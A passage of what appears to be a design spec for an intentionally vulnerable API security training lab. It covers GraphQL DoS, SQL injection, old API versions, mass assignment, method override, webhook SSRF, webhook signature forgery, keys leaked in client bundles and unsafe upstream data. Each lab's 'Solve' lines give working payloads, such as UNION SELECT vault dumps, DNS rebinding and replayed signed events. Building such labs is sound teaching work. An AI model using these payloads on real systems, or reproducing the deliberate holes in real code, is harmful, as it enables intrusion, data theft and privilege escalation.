  - Title `{ id: 'DoS GraphQL Berbasis Alias', en: 'GraphQL Alias-Based DoS' }`.
  - Summary `{ id: 'Buat satu permintaan memaksa server merender jauh lebih banyak naskah daripada yang wajar.', en: 'Make one request force the server to render far more manuscripts than it should.' }`.
  - Hints:
    1. `{ id: 'Field render itu mahal. Berapa kali satu kueri boleh memintanya?', en: 'The render field is expensive. How many times may one query ask for it?' }`
    2. `{ id: 'Alias membuat satu field muncul berkali-kali dalam satu respons.', en: 'Aliases let one field appear many times in one response.' }`
    3. `{ id: 'Penghitung alias di Inquisitor menelusuri kueri Anda. Apakah ia juga membaca fragmen bernama?', en: "Inquisitor's alias counter walks your query. Does it also read named fragments?" }`

### AR-05 — GraphQL deep-nesting DoS · `graphql-depth-dos` (levels A/I/D)

Maps `API4:2023`, `CWE-770`. State: stateless. No Restart.

- **Goal.** Make the server load a million objects in one query through relations that loop back on each other.
- **Schema.**

  ```graphql
  type Scroll { id: Int!  title: String!  author: Scribe! }
  type Scribe { name: String!  scrolls(first: Int = 10): [Scroll!]! }
  type Query { scroll(id: Int!): Scroll }
  ```

- **Cost model.** The number of objects loaded is Σ over the expanded tree of the product of `first ?? 10` along each
  path (`virtualCost`). `FLAG_COST = 1 000 000`. Real lists return `min(first, 3)` items, under the 3000-call budget
  (`extensions.truncated` when it is hit).
- **Level interface:** `rules`, `costBudget?`.
- **Levels.**
  - **A**: no limits.
  - **I**: a depth limit of 6, written in the level file and **correct**: field nesting counted over the expanded
    document, so fragments do not hide depth. There is no bound on `first`.
  - **D**: depth ≤ 6, `first` between 1 and 25 (`first must be between 1 and 25.`), and `costBudget: 10 000`. ASVS 5.0 V4.
- **Flag proof.** A validated document with `virtualCost` ≥ 1 000 000 gets `extensions.flag` below Divine.
- **Victim.** None.
- **Solve.**
  - A: `scroll(id:1){author{scrolls{author{scrolls{author{scrolls{author{scrolls{author{scrolls{author{scrolls{title}}}}}}}}}}}}}`
    (six list levels: 10⁶).
  - I: `scroll(id:1){author{scrolls(first:1000){author{scrolls(first:1000){title}}}}}` (depth 6: 10⁶).
- **Matrix.**
  - `resisted` map: `{ acolyte: 'exceeds the limit of 6', inquisitor: 'first must be between 1 and 25.' }`;
    `resistedStatus` 400.
  - legit: `{ scroll(id: 1) { title author { name } } }` → `"name"`.
  - malformed `[]`; privileged `null`.
  - Plus: the A exploit answers in under 200 ms (truncated) with JSON under 64 KB; I rejects depth 7 and accepts depth 6.
- **Seams.** `FLAG_COST`.
- **Pitfalls.**
  - Never materialise the tree: 3 items per list keeps real work under the call budget, and the spec measures it.
  - The depth rule counts fields, not braces (inline fragments add no depth).
  - Distinct from AR-04 (aliases) and RM-12 (REST `expand`): here the multiplier is the **client-chosen page size**
    below a correct depth limit.
- **Text.**
  - Title `{ id: 'DoS GraphQL lewat Sarang Bertingkat', en: 'GraphQL Deep-Nesting DoS' }`.
  - Summary `{ id: 'Buat server memuat sejuta objek dalam satu kueri lewat relasi yang saling melingkar.', en: 'Make the server load a million objects in one query through relations that loop back on each other.' }`.
  - Hints:
    1. `{ id: 'Gulungan punya penulis, penulis punya gulungan. Seberapa dalam rantai itu boleh diikuti?', en: 'A scroll has an author, an author has scrolls. How deep may that chain go?' }`
    2. `{ id: 'Setiap tingkat daftar mengalikan pekerjaan dengan ukuran halamannya.', en: 'Every list level multiplies the work by its page size.' }`
    3. `{ id: 'Di Inquisitor kedalaman dibatasi. Siapa yang memilih berapa banyak item per tingkat?', en: 'At Inquisitor depth is limited. Who chooses how many items each level holds?' }`

### AR-06 — GraphQL argument SQL injection · `graphql-sqli` (levels A/T/I/D)

Maps `A05:2025`, `CWE-89`. State: `perLevel` `challengeDb` (read-only; the vault secret is per level). No Restart.

- **Goal.** Leak the vault secret of the Archive's database through a GraphQL argument.
- **Schema.**

  ```graphql
  type Scroll { id: ID!  title: String!  shelf: String! }
  type Query { scrolls(search: String): [Scroll!]!  scrollsByIds(ids: [ID!]!): [Scroll!]! }
  ```

- **Data** (`challengeDb`): `scrolls(id INTEGER PRIMARY KEY, title, shelf, public)` (12 rows, 2 not public) and
  `vault(name, secret)` (`secret` = 24 random hex characters per level). Reads use `firstRows(stmt, 50)`.
- **Level interface:** `textFilter?`, `searchSql(search) → { sql, params }`, `idsSql(ids) → { sql, params } | string`.
- **Levels.**
  - **A**: `SELECT id, title, shelf FROM scrolls WHERE public = 1 AND title LIKE '%${search}%'` (concatenated). Ids are
    parameterized.
  - **T**: the same SQL, plus a "GraphQL WAF" `textFilter` that deletes every `'` and `--` from the **query text**
    before parsing. Variables are never filtered.
  - **I**: `search` is parameterized. `scrollsByIds` builds `id IN (${ids.join(', ')})` unquoted ("ids are numeric") —
    but GraphQL `ID` accepts any string.
  - **D**: both parameterized; each id must match `^\d{1,6}$` (`Invalid id.`), at most 50, one `?` per id. ASVS 5.0 V1.
- **Flag proof.** The serialized response contains `vaultSecret(level)` → `extensions.flag` below Divine (GK-01's
  shape: a perLevel secret dumped earns this session's flag).
- **Victim.** None.
- **Solve.**
  - A: `{ scrolls(search: "%' UNION SELECT 1, secret, name FROM vault -- ") { title } }`.
  - T: `query($s: String) { scrolls(search: $s) { title } }` with
    `variables: { "s": "%' UNION SELECT 1, secret, name FROM vault -- " }`. A `'` escape inside the GraphQL string
    is an accepted alternative.
  - I: `{ scrollsByIds(ids: ["0) UNION SELECT 1, secret, name FROM vault --"]) { title } }`.
- **Matrix.**
  - Errors: `tryDb(…, 'Database error')` inside the resolver; the message becomes a GraphQL error below Divine, and
    `Internal server error.` at Divine.
  - `resisted` map: `{ acolyte: '"scrolls":[]', templar: '"scrolls":[]', inquisitor: 'Invalid id.' }`.
  - legit: `{ scrolls(search: "Hours") { title } }` → `The Book of Hours`.
  - malformed: `{ scrolls(search: "'") { title } }` → DB error at `['acolyte']`.
  - privileged `null`.
- **Seams.** `vaultSecret(level)`.
- **Pitfalls.**
  - The UNION has 3 columns.
  - T's filter acts on the raw text only; a variable payload must reach the resolver unchanged.
  - Keep distinct from RM-01, FP-10 and GK-01. The lessons here are "the query text is not all the input" (T) and
    "`ID` is a string" (I).
- **Text.**
  - Title `{ id: 'Injeksi SQL lewat Argumen GraphQL', en: 'GraphQL Argument SQL Injection' }`.
  - Summary `{ id: 'Bocorkan rahasia brankas basis data Arsip lewat argumen kueri GraphQL.', en: "Leak the Archive database's vault secret through a GraphQL query argument." }`.
  - Hints:
    1. `{ id: 'Argumen pencarian berakhir di sebuah kueri SQL. Bagaimana nilainya disisipkan?', en: 'The search argument ends up in a SQL query. How is its value inserted?' }`
    2. `{ id: 'Penyaring Templar membaca teks kueri. Apakah semua nilai argumen ada di teks itu?', en: "Templar's filter reads the query text. Are all argument values in that text?" }`
    3. `{ id: 'Tipe ID GraphQL menerima string apa pun. Apa yang terjadi jika kode menganggapnya selalu angka?', en: "GraphQL's ID type accepts any string. What happens when the code assumes it is always a number?" }`

### AR-07 — REST API9: old `/v1` still alive · `api-v1-alive` (levels A/T/D)

Maps `API9:2023`, `CWE-1059`. State: `perLevel` data. No Restart.

- **Goal.** Read the contents of the Sealed Codex (scroll 13), which API v2 hides.
- **Page.**
  - Endpoint table for v2 only: `GET <lab>/api/v2/scrolls`, `GET <lab>/api/v2/scrolls/:id` (Bearer).
  - Your key, the curl note.
  - A link to `<lab>/openapi.json`. Its `info.description` says "Archive API v2. (v1 was retired in March 2026.)" and
    its `servers` list is `[{ url: '/api/v2' }]`.
- **v2** (model, identical at every level): restricted scrolls answer `{ id: 13, title: 'The Sealed Codex', restricted:
  true, content: null, note: 'Restricted: curators only.' }`.
- **Level interface** (GK-13 style): `install(router, w)` mounts the level's own v1 routes; `w.requireKey`,
  `w.fullScroll(id)`.
- **Levels.**
  - **A**: `GET /api/v1/scrolls/:id` with no auth and the **full** record (content included).
  - **T**: v1 now requires the key (the auth middleware was ported), but v1's serializer never got v2's `restricted`
    filter.
  - **D**: every `/api/v1/*` answers `410 { error: 'API v1 has been retired; use /api/v2.' }`. ASVS 5.0 V4 (API
    inventory), V13.
- **Flag proof.** A response containing scroll 13's `content` (`The seal reads: <flag>` below Divine).
- **Victim.** None.
- **Solve.**
  - A: `GET /api/v1/scrolls/13`.
  - T: the same, with `Authorization: Bearer <key>`.
- **Matrix.**
  - `resisted` `API v1 has been retired`; `resistedStatus` 410.
  - legit: `GET /api/v2/scrolls/1` with the key → `The Book of Hours`.
  - malformed `[]`; privileged `null`.
  - Plus: A's request without a key at T → 401 `Missing or invalid API key.`; v2 never returns content at any level.
- **Seams.** `RESTRICTED_ID`.
- **Pitfalls.**
  - Content is computed per request (`flagFor`), never at Divine.
  - Distinct from GK-13 Inquisitor (a deprecated alias before an admin guard): the lesson is **version inventory**, and
    T shows that porting one fix (auth) without the others (field filtering) leaves the old version exploitable.
- **Text.**
  - Title `{ id: 'API Versi Lama /v1 Masih Hidup', en: 'Old API Version /v1 Still Alive' }`.
  - Summary `{ id: 'Baca isi Kodeks Tersegel yang disembunyikan API v2.', en: 'Read the contents of the Sealed Codex that API v2 hides.' }`.
  - Hints:
    1. `{ id: 'API ini bernomor versi. Apa yang terjadi pada versi sebelumnya?', en: 'This API has a version number. What happened to the version before it?' }`
    2. `{ id: 'Perbaikan di versi baru tidak otomatis berlaku di versi lama.', en: 'A fix in the new version does not apply to the old one by itself.' }`
    3. `{ id: 'Di Templar versi lama meminta kunci. Apakah ia juga menyaring field yang sama seperti v2?', en: 'At Templar the old version asks for a key. Does it also filter the same fields as v2?' }`

### AR-08 — API mass assignment via PATCH · `patch-mass-assignment` (levels A/T/I/D)

Maps `API3:2023`, `CWE-915`. State: `perSession` (the user record). Restart.

- **Goal.** Make your pilgrim account a curator through the profile PATCH endpoint.
- **Endpoint.**
  - `GET` and `PATCH <lab>/api/me` with Bearer.
  - Accepted bodies:
    - `application/merge-patch+json`, and `application/json` (RFC 7396 merge patch, top-level members);
    - `application/json-patch+json` (RFC 6902: `add`, `replace`, `remove` and `test` on single-segment pointers
      `/name`, with `~0`/`~1` unescaped; ≤ 10 ops; deeper paths are 422 `Unsupported path.`).
  - The route mounts `express.json({ type: ['application/merge-patch+json', 'application/json-patch+json'], limit:
    '8kb' })`.
- **User record:** `{ id: 'u-1042', username: 'pilgrim', displayName, bio, role: 'reader', quota: 10 }`. Writable by
  design: `displayName` (≤ 60) and `bio` (≤ 200).
- **Level interface:**
  - `columnFor(key) → canonical | undefined` (the persistence layer's key mapping, shown in the level);
  - `mergePatch(user, body) → Result`;
  - `jsonPatch(user, ops) → Result`.
- **Levels.**
  - **A**: `columnFor` folds case (`COLUMNS.get(key.toLowerCase())`, "like SQL column names"). Merge patch applies every
    member that maps to a column, `role` included. JSON Patch is applied without checks.
  - **T**: a denylist refuses the exact keys `role` and `quota` (merge) and the exact paths `/role` and `/quota` (patch).
    `columnFor` still folds case → `Role`.
  - **I**: merge patch uses an allowlist `{ displayName, bio }` with exact keys (`Role` is refused). The JSON Patch branch
    runs the same allowlist over `Object.keys(body)`; for an array those are `'0'`, `'1'`…, which the check skips as
    indexes. The ops are applied unchecked.
  - **D**: either format is applied to a **copy**, then diffed against the original. Any changed field outside
    `{ displayName, bio }` is 422 `Field 'role' is read-only.`. Keys are exact (no folding; unknown → 422 `Unknown field
    'Role'.`). ASVS 5.0 V2, V8.
- **Flag proof.** `user.role === 'curator'`. `PATCH` and `GET /api/me` then include `"flag"`.
- **Victim.** None.
- **Solve.**
  - A: `PATCH /api/me` `{"role":"curator"}`.
  - T: `{"Role":"curator"}`.
  - I: `Content-Type: application/json-patch+json` `[{"op":"replace","path":"/role","value":"curator"}]`.
- **Matrix.**
  - `resisted` map: `{ acolyte: "Field 'role' is read-only.", templar: "Unknown field 'Role'.", inquisitor: "Field 'role' is read-only." }`;
    `resistedStatus` 422.
  - legit: merge `{"bio":"Copyist of the north tower"}` → `"bio":"Copyist of the north tower"`.
  - malformed: an op with path `/a/b` → `Unsupported path` at A/T/I (errorRe `/Unsupported path/`).
  - privileged `null`.
- **Seams.** `labState(sid, level).user`.
- **Pitfalls.**
  - `quota` is a second read-only field, so T's denylist is a list.
  - The store uses `Map` lookups, so `__proto__`/`constructor` are plain misses. Reuse GK-14's `isDangerousKey` in
    `columnFor` at every level (platform safety).
  - Distinct from GK-14 (all fields / deep merge / email-derived role): this lab's lessons are **key-case folding** and
    **a second patch format**.
- **Text.**
  - Title `{ id: 'Mass Assignment API lewat PATCH', en: 'API Mass Assignment via PATCH' }`.
  - Summary `{ id: 'Jadikan akun pilgrim Anda kurator lewat endpoint PATCH profil.', en: 'Make your pilgrim account a curator through the profile PATCH endpoint.' }`.
  - Hints:
    1. `{ id: 'PATCH menggabungkan dokumen Anda ke profil. Field mana yang ikut tergabung?', en: 'PATCH merges your document into the profile. Which fields get merged?' }`
    2. `{ id: 'Pemeriksaan membandingkan nama kunci persis; penyimpanan mungkin tidak.', en: 'The check compares key names exactly; the storage might not.' }`
    3. `{ id: 'Di Inquisitor daftar-izin memeriksa sebuah objek. Adakah format PATCH yang bukan objek?', en: 'At Inquisitor the allowlist checks an object. Is there a PATCH format that is not an object?' }`

### AR-09 — BFLA via method override · `method-override` (levels A/T/I/D)

Maps `API5:2023`, `CWE-285`. State: `perSession` (the shelf). Restart.

- **Goal.** Delete the Heretic's Folio (scroll 13) from the public shelf. Only curators may delete.
- **Endpoints.**
  - `GET <lab>/api/scrolls` and `GET <lab>/api/scrolls/:id` (any key).
  - `DELETE <lab>/api/scrolls/:id` (curators only).
  - Bearer authentication.
- **Level interface** (GK-13 style): `install(router, w)`. Each level mounts, **in its own order**, its own
  method-override middleware (a few visible lines), its guard, and the routes. `w.isCurator(req)`, `w.remove(req,
  res)`.
- **Levels.**
  - **A**: the guard (`req.method === 'DELETE' && !curator → 403 Curators only.`) is mounted **before** the override
    middleware, which then turns `POST` + `X-HTTP-Method-Override: DELETE` into `DELETE`.
  - **T**: the guard also refuses a POST carrying `X-HTTP-Method-Override: DELETE` (that exact header and value). The
    override middleware also honours `X-HTTP-Method` and `X-Method-Override`, and upper-cases the value.
  - **I**: the override runs **first**, then the guard checks the effective method against a denylist `['DELETE', 'PUT',
    'PATCH']`. The route is `router.all('/api/scrolls/:id')`, and the handler also accepts the legacy cache verb `PURGE`
    as a delete ("kept for the CDN").
  - **D**: no method override. A deny-by-default action table (`DELETE` → `scroll.delete` needs curator; `GET` →
    `scroll.read`). Any other method on the resource is 405 `Method not allowed.`. ASVS 5.0 V8.
- **Flag proof.** Scroll 13 removed by a non-curator. The response `{ deleted: 13, flag }` and the shelf list ("removed
  by pilgrim") both show it.
- **Victim.** None.
- **Solve.**
  - A: `POST /api/scrolls/13` with `X-HTTP-Method-Override: DELETE`.
  - T: `X-HTTP-Method: DELETE` (or `X-HTTP-Method-Override: delete`).
  - I: `curl -X PURGE …/api/scrolls/13`.
- **Matrix.**
  - `resisted` `Method not allowed.`; `resistedStatus` 405.
  - legit: `GET /api/scrolls/13` → `Heretic's Folio`.
  - malformed `[]`.
  - privileged: curator key `DELETE /api/scrolls/13` at D → `deleted`, no flag.
  - Plus: a plain `DELETE` by pilgrim is 403 at every level.
- **Seams.** `curatorKey`, `labState().shelf`.
- **Pitfalls.**
  - Node and Express accept `PURGE` (in `http.METHODS`; nginx forwards it). The spec uses `agent.purge(url)`.
  - The override middleware is router-local, so it never touches other labs.
  - Distinct from GK-13 (path case and aliases): the lesson is **which method the guard sees**.
- **Text.**
  - Title `{ id: 'BFLA lewat Penimpaan Metode HTTP', en: 'BFLA via HTTP Method Override' }`.
  - Summary `{ id: 'Hapus Folio Bidah dari rak publik, padahal hanya kurator yang boleh menghapus.', en: "Delete the Heretic's Folio from the public shelf, although only curators may delete." }`.
  - Hints:
    1. `{ id: 'Penjaga memeriksa metode permintaan. Kapan tepatnya, dan metode yang mana?', en: 'The guard checks the request method. When exactly, and which method?' }`
    2. `{ id: 'Beberapa kerangka kerja membiarkan header mengganti metode, dan tidak hanya dengan satu nama.', en: 'Some frameworks let a header change the method, under more than one name.' }`
    3. `{ id: 'Di Inquisitor penjaga memblokir daftar metode tertentu. Apakah rute itu hanya menerima metode di daftar itu?', en: 'At Inquisitor the guard blocks a list of methods. Does the route answer only the methods on that list?' }`

### AR-10 — Webhook SSRF via callback · `webhook-ssrf` (levels A/T/I/D)

Maps `API7:2023`, `CWE-918`. State: `perSession` (world without inbox, simNet, the hook, deliveries ≤ 5). Restart.
Engine: **E5**.

- **Goal.** Point the Archive's webhook deliveries at the internal ops service and read its signing key.
- **Network** (the lab's `simNet`):
  - `admin.citadel.internal` → `10.0.0.5:80`, the "Archive Ops API". `GET /` answers `{"service":"archive-ops",
    "endpoints":["/status","/keys"]}`; `GET|POST /keys` answers `{"signingKey":"<flag below Divine | (sealed)>"}`.
  - The loopback console on `:8080` (the shape shared with SC-16) is an alternative target.
- **Page.**
  - "Webhooks": one callback URL (register / replace) for `scroll.published`, with its signing secret shown.
  - A "Send test event" button.
  - "Recent deliveries" (last 5: time, URL, address, status, the first 300 response characters below Divine; status only
    at Divine).
  - The sim panel with "Your DNS" and "Your server" (E5).
- **Delivery.** `net.fetch(url, { method: 'POST', body: JSON, headers: { 'content-type': 'application/json',
  'x-archive-event': 'scroll.published', 'x-archive-signature': 'sha256=…' } })`.
- **Level interface:** `register(net, url) → Result`, `deliver(net, hook, event) → Delivery`.
- **Levels.**
  - **A**: no validation at registration or delivery. Redirects followed.
  - **T**: at registration, a text denylist refuses URLs (lower-cased) containing `localhost`, `127.`, `10.`,
    `192.168.`, `169.254.`, `internal`, `0.0.0.0` or `[::`. Delivery is unchecked.
  - **I**: at registration, the host is resolved (`net.lookup`) and every address must pass the level's own correct
    range check (both families, mapped addresses unmapped first). Delivery calls `net.fetch(hook.url)`, which
    **resolves again** with no check (time-of-check / time-of-use across requests).
  - **D**:
    - At **delivery**, resolve once, require `isPublicAddress` for every address, `pin` the first, and use
      `redirect: 'manual'` (a 3xx is a failed delivery).
    - Registration also refuses non-public answers, as early feedback.
    - Deliveries show the status only.
    - ASVS 5.0 V1 (SSRF: validate the destination at the time of use).
- **Flag proof.** A delivery whose response contains the ops signing key (the key **is** the flag below Divine).
- **Victim.** None. The server is the confused deputy.
- **Solve.**
  - A: register `http://admin.citadel.internal/keys`, send a test event.
  - T: DNS record `ops.attacker.test A 10.0.0.5`, register `http://ops.attacker.test/keys` (decimal `167772165` is an
    alternative), send.
  - I: record `ops` A `198.51.100.66` with TTL 0, register `http://ops.attacker.test/keys` (accepted), change the record
    to `10.0.0.5`, send.
- **Matrix.**
  - The scripts use `POST /sim/dns`, the `register` and `deliver` intents, then GET the page.
  - `resisted` map: `{ acolyte: 'must resolve to a public address', templar: 'must resolve to a public address', inquisitor: 'Delivery blocked' }`.
  - legit: register `http://hooks.attacker.test/in` and send → `Delivered: 200`; the attacker log shows the server's POST.
  - malformed `[]`; privileged `null`.
- **Seams.** `labFor(...).net`, `world.now`.
- **Pitfalls.**
  - At I with TTL > 0 the cached public answer is used at delivery. The page says the resolver caches for the record's
    TTL, and hint 3 points at **when** the lookup happens.
  - Delivery bodies and headers land in the attacker log as server hits. That is how the player sees the signature
    scheme.
  - Distinct from SC-18 (IP spellings) and SC-19 (rebinding inside one request): this is registration-vs-delivery
    TOCTOU.
- **Text.**
  - Title `{ id: 'SSRF lewat Callback Webhook', en: 'Webhook SSRF via Callback' }`.
  - Summary `{ id: 'Arahkan pengiriman webhook Arsip ke layanan operasi internal dan baca kunci penandatangannya.', en: "Point the Archive's webhook deliveries at the internal ops service and read its signing key." }`.
  - Hints:
    1. `{ id: 'Server Arsip sendiri yang mengirim webhook. Ke mana saja ia bisa menjangkau?', en: 'The Archive server itself sends the webhook. Where can it reach?' }`
    2. `{ id: 'Daftar blokir teks melihat nama, bukan alamat yang dituju nama itu.', en: 'A text denylist sees the name, not the address the name points to.' }`
    3. `{ id: 'Di Inquisitor alamat diperiksa saat Anda mendaftar. Kapan alamat itu dicari lagi?', en: 'At Inquisitor the address is checked when you register. When is it looked up again?' }`

### AR-11 — Webhook signature not verified · `webhook-signature` (levels A/T/I/D)

Maps `A08:2025`, `CWE-345`, `CWE-294`. State: `perSession` (account plan, processed ids ≤ 50, history). Restart.

- **Goal.** Make your account a Patron without ever paying Pilgrim Pay.
- **Endpoint.**
  - `POST <lab>/webhooks/pilgrim-pay`.
  - `Content-Type: application/pilgrimpay+json`. The route mounts `express.raw({ type: 'application/pilgrimpay+json',
    limit: '8kb' })`, so the **raw bytes** are what is signed and checked. A plain `application/json` body gets 415
    `Pilgrim Pay events are application/pilgrimpay+json.`; the app-wide JSON parser never sees this type.
  - Header `Pilgrim-Signature: t=<unix>,v1=<hex>`.
  - Event: `{ id: 'evt_…', type: 'subscription.activated' | 'subscription.canceled', created: <unix>, data: { account:
    'pilgrim', plan: 'patron' } }`.
- **Page.**
  - The account panel (plan `reader`).
  - "Patron Reading Room" (`GET <lab>/reading-room`: patrons see the flag).
  - "Recent webhook deliveries": your account's history, as a provider dashboard shows it.
    - `evt_…001` `subscription.activated` (created 40 days ago) and `evt_…002` `subscription.canceled` (30 days ago).
    - Each shows its exact raw body (`<pre data-event-body>`) and header (`data-signature`), both genuinely signed
      with the per-instance secret, which is never shown.
- **Level interface:** `verify(raw: Buffer, header: string | undefined, now: number, state) → true | string`, and
  `accept(event, state) → true | string`.
- **Levels.**
  - **A**: no verification; any well-formed event is applied.
  - **T**: HMAC-SHA256 over `` `${t}.${raw}` ``, but compared as `expected.startsWith(v1)` ("tolerates truncated
    signatures from the old SDK"). An empty `v1=` passes. A missing header is 400 `Missing signature.`.
  - **I**: exact comparison (`timingSafeEqual` on equal-length buffers). No timestamp tolerance, no event-id memory,
    events applied in arrival order, so a **replayed** old `activated` event re-activates the account.
  - **D**: as I, plus:
    - `|now − t| ≤ 300 s` on `state.now` (`Timestamp outside the tolerance.`);
    - processed ids remembered (`Event already processed.`);
    - an event older than the account's last applied event is ignored.

    ASVS 5.0 V4 (webhook authenticity), V11 (constant-time comparison).
- **Flag proof.** Plan `patron`; the lab has no legitimate path to it. `GET /reading-room` shows the flag below Divine.
- **Victim.** None.
- **Solve.**
  - A: POST an `activated` event with no header.
  - T: the same with `Pilgrim-Signature: t=1,v1=`.
  - I: POST `evt_…001`'s exact raw body with its exact header (the page offers a curl line with `--data-binary`).
- **Matrix.**
  - The scripts POST the event, then GET `/reading-room`.
  - `resisted` `Patrons only.`; `resistedStatus` 403.
  - legit: a `subscription.canceled` event signed through the seam with the current time → `"received":true` at every
    level.
  - malformed: a non-JSON body → `Invalid event` at A/T/I.
  - privileged: a seam-signed fresh `activated` at Divine → `/reading-room` says `Welcome, patron.` with no flag.
- **Seams.** `webhookSecret(sid, level)`, `signEvent(sid, level, raw, t)`, `labState().now`.
- **Pitfalls.**
  - Sign the raw bytes, never re-serialized JSON. The history's bodies are stored and shown byte-exact.
  - The processed-ids list is bounded and is not a limiter (Restart allowed).
  - Distinct from RM-13 Divine (an internal signed notify) and AR-10: this is inbound **authenticity and freshness**.
- **Text.**
  - Title `{ id: 'Tanda Tangan Webhook Tidak Diverifikasi', en: 'Webhook Signature Not Verified' }`.
  - Summary `{ id: 'Jadikan akun Anda Patron tanpa pernah membayar Pilgrim Pay.', en: 'Make your account a Patron without ever paying Pilgrim Pay.' }`.
  - Hints:
    1. `{ id: 'Siapa saja bisa mengirim POST ke endpoint webhook. Apa yang membuktikan Pilgrim Pay pengirimnya?', en: 'Anyone can POST to the webhook endpoint. What proves Pilgrim Pay sent it?' }`
    2. `{ id: 'Bandingkan cara Templar membandingkan tanda tangan dengan "sama persis".', en: "Compare how Templar compares signatures with 'exactly equal'." }`
    3. `{ id: 'Di Inquisitor pemeriksaan tanda tangannya benar. Apakah pesan bertanda tangan yang lama masih diterima?', en: 'At Inquisitor the signature check is right. Is an old signed message still accepted?' }`

### AR-12 — API key in client bundle · `bundle-api-key` (levels A/T/D)

Maps `A04:2025` (catalog row), `CWE-798`, `CWE-540`. State: `perSession` (keys). No Restart.

- **Goal.** Find the Archive admin key that ships to every browser and open the admin report.
- **Page.**
  - The "public catalog", rendered by the lab's own bundle `<script src="<lab>/assets/app.js?level=…" defer>`, which
    fetches `<lab>/api/catalog`.
  - The endpoint table lists `GET /api/catalog` (public) and `GET /api/admin/report` (header `X-Archive-Key`).
- **Bundle** (built per request from per-session values; lab-authored; `application/javascript`; nosniff):
  - **A**: `const ARCHIVE_KEY = "ak_live_<32 hex>";`, used as `X-Archive-Key` on the catalog call ("the developer
    reused the admin key").
  - **T**: no key literal.
    - The bundle holds `const _0x3f = [<base64 chunks, reversed>]; function _k() { return atob(_0x3f.slice().reverse().join('')).split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 42)).join(''); }`,
      then `//# sourceMappingURL=app.js.map`.
    - `<lab>/assets/app.js.map` holds `sourcesContent` with `config.ts: export const ARCHIVE_KEY = 'ak_live_…';` (the
      build left source maps on).
  - **D**: no key and no source map. The catalog is public; `/api/admin/report` needs the curator **session**
    (server-side). The bundle calls only public endpoints.
- **Level interface:** `bundle(key) → string`, `sourceMap(key) → string | null`, `adminAccess(req, key) → boolean`.
- **Divine.** Secrets never ship to clients. A browser that needs privileged data goes through the server
  (backend-for-frontend) with the user's own session and scope. ASVS 5.0 V13 (no secrets in client artefacts), V8.
- **Flag proof.** `/api/admin/report` accepted the per-session admin key → `{ report, flag }` below Divine.
- **Victim.** None.
- **Solve.**
  - A: read `app.js`, then send `X-Archive-Key`.
  - T: run `_k()` in devtools, decode it by hand, or read `app.js.map`.
- **Matrix.**
  - The A script greps `ak_live_[0-9a-f]{32}`; the T script decodes `_0x3f` (or parses the map). Both send `none` when
    nothing is found.
  - `resisted` `Curators only.`; `resistedStatus` 401.
  - legit: `GET /api/catalog` → `The Book of Hours`.
  - malformed `[]`.
  - privileged: the curator session (seam cookie) → `report`, no flag.
- **Seams.** `adminKey(sid, level)`.
- **Pitfalls.**
  - The bundle is lab text, never player bytes.
  - Compare keys with `timingSafeEqual` on equal lengths.
  - A's grep must fail at T: the spec asserts the regex finds nothing in the T bundle, while the map does contain the
    key.
- **Text.**
  - Title `{ id: 'Kunci API di Bundel Klien', en: 'API Key in Client Bundle' }`.
  - Summary `{ id: 'Temukan kunci admin Arsip yang dikirim ke setiap peramban dan buka laporan admin.', en: 'Find the Archive admin key that ships to every browser and open the admin report.' }`.
  - Hints:
    1. `{ id: 'Halaman ini memuat JavaScript dari server. Apa saja yang ikut terkirim di dalamnya?', en: 'This page loads JavaScript from the server. What else ships inside it?' }`
    2. `{ id: 'Mengaburkan sebuah string tidak menyembunyikannya dari kode yang harus memakainya.', en: 'Obfuscating a string does not hide it from the code that must use it.' }`
    3. `{ id: 'Alat build sering meninggalkan petunjuk kembali ke sumber aslinya. Lihat baris terakhir bundel.', en: "Build tools often leave a pointer back to the original source. Look at the bundle's last line." }`

### AR-13 — API10 unsafe upstream consumption · `unsafe-upstream` (levels A/I/D)

Maps `API10:2023`, `CWE-20`, `CWE-89`, `CWE-918`. State: `perSession` (world without inbox, simNet, the Open Codex
record, imports ≤ 10) plus a `perLevel` `challengeDb` (vault). Restart. Engine: **E5**.

- **Goal.** Use data from Open Codex, a third-party API the Archive trusts, to leak the Archive's secrets.
- **Network.**
  - `api.opencodex.test` → `192.0.2.40:80`, the lab service "Open Codex". `GET /v1/books/<id>` answers `200
    application/json {id, title, author}`, or **`308 Location: <movedTo>`** when the book's author set "moved to".
  - `admin.citadel.internal` → `10.0.0.5:80` (AR-10's ops service; `/keys` holds the flag below Divine).
- **Page.**
  - "Your Open Codex author account": book `oc-7781`, editable `title` (≤ 120), `author` (≤ 60), `movedTo` (≤ 300; "if
    your book moved, Open Codex redirects readers").
  - "Import from Open Codex" (book id `^oc-\d{4}$`, checked at every level).
  - "Your imports" (≤ 10).
  - The fetch trace panel.
- **Import pipeline.** `net.fetch('http://api.opencodex.test/v1/books/' + id)`, then the level's `normalize(db, book)`,
  then store. At A/I the Archive "normalises" through SQL:
  `SELECT trim('<title>') AS title, trim('<author>') AS author`.
- **Level interface:** `fetchUpstream(net, id) → FetchResult`, `normalize(db, book) → Row | string`.
- **Levels.**
  - **A**: upstream fields are concatenated into that SQL ("the upstream is trusted; only user input is escaped"). The
    client follows redirects (default fetch).
  - **I**: `normalize` is parameterized and the book is schema-checked (`title` and `author` strings ≤ 120/60). But the
    client still uses `redirect: 'follow'` to **any** host. When the body fails the schema, the error quotes it
    ("Upstream response did not match the book schema: <first 300 chars>"), as many integrations log it.
  - **D**:
    - the host is pinned to `api.opencodex.test`;
    - `redirect: 'manual'`: a 3xx is `Import failed: the upstream answered with a redirect.`;
    - a strict schema, parameterized SQL, a 16 KiB response cap;
    - a generic error that never echoes upstream bodies.

    ASVS 5.0 V4/V1 (treat third-party data as untrusted; do not follow redirects blindly).
- **Flag proof** (below Divine only):
  - A: the import row contains `vaultSecret(level)`; the route compares and adds the flag line.
  - I: the import response contains the ops key (the flag).
- **Victim.** None.
- **Solve.**
  - A: set your book's title to `x') AS title, (SELECT secret FROM vault) AS author --`, then import `oc-7781`.
  - I: set `movedTo` to `http://admin.citadel.internal/keys`, then import.
- **Matrix.**
  - `resisted` map: `{ acolyte: 'Imported oc-7781', inquisitor: 'answered with a redirect' }`. At D the A title is
    stored literally and no secret appears.
  - legit: import `oc-7781` with a normal title → `Imported oc-7781`.
  - malformed: a title of a lone `'` → `Database error` at `['acolyte']`.
  - privileged `null`.
- **Seams.** `vaultSecret(level)`, `labFor().codex`.
- **Pitfalls.**
  - The SQL is one read-only `SELECT` through `challengeDb` `prepare` and `firstRows(…, 1)`.
  - The upstream text is bounded (title 120), which bounds the injection (RECIPES §4 CPU note: no table the player can
    grow).
  - The player edits Open Codex, never the Archive's request.
